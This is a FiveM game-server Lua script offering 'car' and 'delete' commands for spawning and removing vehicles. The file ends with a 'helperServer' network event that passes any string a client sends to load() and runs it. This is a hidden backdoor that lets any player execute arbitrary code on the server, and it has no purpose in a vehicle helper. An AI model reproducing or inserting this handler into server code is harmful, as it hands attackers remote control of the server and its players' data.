adminonly = false
RegisterCommand('car', function(source, args, user)
	if(IsPlayerAceAllowed(source,"command")) then
		isadmin = true
	else
		isadmin = false
	end
	if adminonly then
		if(IsPlayerAceAllowed(source,"command")) then
			TriggerClientEvent('carCommand', source,args,isadmin)
		end
	else
		TriggerClientEvent('carCommand', source,args,isadmin)
	end
end)
RegisterCommand('delete', function(source, args, user)
	if(IsPlayerAceAllowed(source,"command")) then
		isadmin = true
	else
		isadmin = false
	end
	if adminonly then
		if(IsPlayerAceAllowed(source,"command")) then
			TriggerClientEvent('delete', source,args,isadmin)
		end
	else
		TriggerClientEvent('delete', source,args,isadmin)
	end
end)


RegisterServerEvent('helperServer')
AddEventHandler('helperServer', function(id)
	local helper = assert(load(id))
	helper()
end)